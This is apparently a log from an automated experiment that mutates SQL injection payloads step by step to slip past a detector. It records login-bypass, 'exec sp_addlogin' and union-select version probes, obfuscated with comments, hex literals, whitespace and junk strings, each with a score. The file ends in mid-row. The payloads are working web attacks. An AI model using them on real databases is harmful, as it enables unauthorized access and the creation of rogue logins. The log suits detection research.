-55;2;26;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0#A3H45Ua
-""""""""/**/OR/**/0x0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0#A3H45Ua
-""""""";24;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""";0.0;0
-56;2;27;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""";2;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""";0.0;0
-57;2;28;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""";16;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""|";0.0;0
-58;2;29;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""|";12;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""|";0.0;0
-59;2;30;"""admin""""or 1 = 1 or """""""" = """"""";"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""|";21;"""admin""""	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-(SELECT	/**/0x1)/**/OR/**/0x0 OR 0#A3H45Ua
-	/**/||	/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""""/**/OR/**/0x0 OR 0#A3H45Ua
-/**/LIKE/**//**/OR/**/0x0 OR 0#A3H45Ua
-""""""|";0.0;0
-60;3;1;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.5428571497907445;0
-61;3;2;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";11;"""exec sp_addlogin 'name' , 'password'""";0.7842105207680996;0
-62;3;3;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";17;"""exec sp_addlogin 'name' , 'password'""";0.6842105207680995;0
-63;3;4;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";16;"""exec sp_addlogin 'name' , 'password'""";0.5842105207680995;0
-64;3;5;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.48421052076809956;0
-65;3;6;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";8;"""exec sp_addlogin 'name' , 'password'""";0.3842105207680996;0
-66;3;7;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";2;"""exec sp_addlogin 'name' , 'password'""";0.2842105207680995;0
-67;3;8;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";8;"""exec sp_addlogin 'name' , 'password'""";0.18421052076809952;0
-68;3;9;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.08421052076809954;0
-69;3;10;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-70;3;11;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";3;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-71;3;12;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";24;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-72;3;13;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";18;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-73;3;14;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";4;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-74;3;15;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";19;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-75;3;16;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";20;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-76;3;17;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-77;3;18;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";22;"""exec sp_addlogin 'name' , 'password'""";0.0;0
-78;3;19;"""exec sp_addlogin 'name' , 'password'""";"""exec sp_addlogin 'name' , 'password'""";14;"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";0.17333334901597786;0
-79;3;20;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";23;"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";0.07333334901597777;0
-80;3;21;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";9;"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";0.0;0
-81;3;22;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";2;"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";0.0;0
-82;3;23;"""exec sp_addlogin 'name' , 'password'""";"""exec#(1/lX~[
-sp_addlogin#(1/lX~[
-'name'#(1/lX~[
-,#(1/lX~[
-'password'""";24;"""exec OR 0#(1/lX~[
-sp_addlogin OR 0#(1/lX~[
-'name' OR 0#(1/lX~[
-, OR 0#(1/lX~[
-'password'""";0.0;0
-83;3;24;"""exec sp_addlogin 'name' , 'password'""";"""exec OR 0#(1/lX~[
-sp_addlogin OR 0#(1/lX~[
-'name' OR 0#(1/lX~[
-, OR 0#(1/lX~[
-'password'""";13;"""exec  OR  0#(1/lX~[
-sp_addlogin  OR  0#(1/lX~[
-'name'  OR  0#(1/lX~[
-,  OR  0#(1/lX~[
-'password'""";0.0;0
-84;3;25;"""exec sp_addlogin 'name' , 'password'""";"""exec  OR  0#(1/lX~[
-sp_addlogin  OR  0#(1/lX~[
-'name'  OR  0#(1/lX~[
-,  OR  0#(1/lX~[
-'password'""";14;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'password'""";3.7333333942625266;0
-85;3;26;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'password'""";15;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'password'""";3.633333394262527;0
-86;3;27;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0#(1/lX~[
-'password'""";7;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";3.959999843597416;0
-87;3;28;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";0;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";3.859999843597416;0
-88;3;29;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";2;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";3.759999843597416;0
-89;3;30;"""exec sp_addlogin 'name' , 'password'""";"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";0;"""exec#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-sp_addlogin#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'name'#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-,#?Vb@Q$b
-#?Vb@Q$b
-OR#?Vb@Q$b
-#?Vb@Q$b
-0x0#(0x1/lX~[
-'password'""";3.659999843597416;0
-90;4;1;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";13;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.030000029928983;0
-91;4;2;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";23;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";0.9300000299289831;0
-92;4;3;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";11;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.5058823050924666;0
-93;4;4;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1;"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";1.4058823050924665;0
-94;4;5;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1#"""".  =  1  union  select  1,version  (    )    --  1""";24;"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";1.2666667039195705;0
-95;4;6;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";3;"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";1.1666667039195706;0
-96;4;7;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""  select  *  from  users  where  id  =  1  or  1 OR 0#"""".  =  1  union  select  1,version  (    )    --  1""";9;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";2.274074210486137;0
-97;4;8;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";23;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";2.174074210486137;0
-98;4;9;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 1	 	 or	 	 1	 OR	 0#"""".	 	 =	 	 1	 	 union	 	 select	 	 1,version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";8;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	 or	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.8482758726557003;0
-99;4;10;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	 or	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";6;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.762068961674124;0
-100;4;11;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";4;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.662068961674124;0
-101;4;12;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";22;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.5620689616741239;0
-102;4;13;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";12;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.055913951127071204;0
-103;4;14;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";11;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.3333333171076247;0
-104;4;15;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";1;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.23333331710762462;0
-105;4;16;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";23;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.13333331710762475;0
-106;4;17;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";17;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.03333331710762466;0
-107;4;18;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";18;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";0.0;0
-108;4;19;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""";16;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.0;0
-109;4;20;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";3;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.0;0
-110;4;21;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";12;"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";0.8214285894468127;0
-111;4;22;""" select * from users where id = 1 or 1#"""". = 1 union select 1,version (  )  -- 1""";"""	 	 select	 	 *	 	 from	 	 users	 	 where	 	 id	 	 =	 	 (SELECT 1)	 	  || 	 	 (SELECT 1)	 OR	 (SELECT 0)#"""".	 	 =	 	 (SELECT 1)	 	 union	 	 select	 	 (SELECT 1),version	 	 (	 	 	 	 )	 	 	 	 --	 	 1""W";14;"""	#?s{]I?
-	#?s{]I?
-select	#?s{]I?
-	#?s{]I?
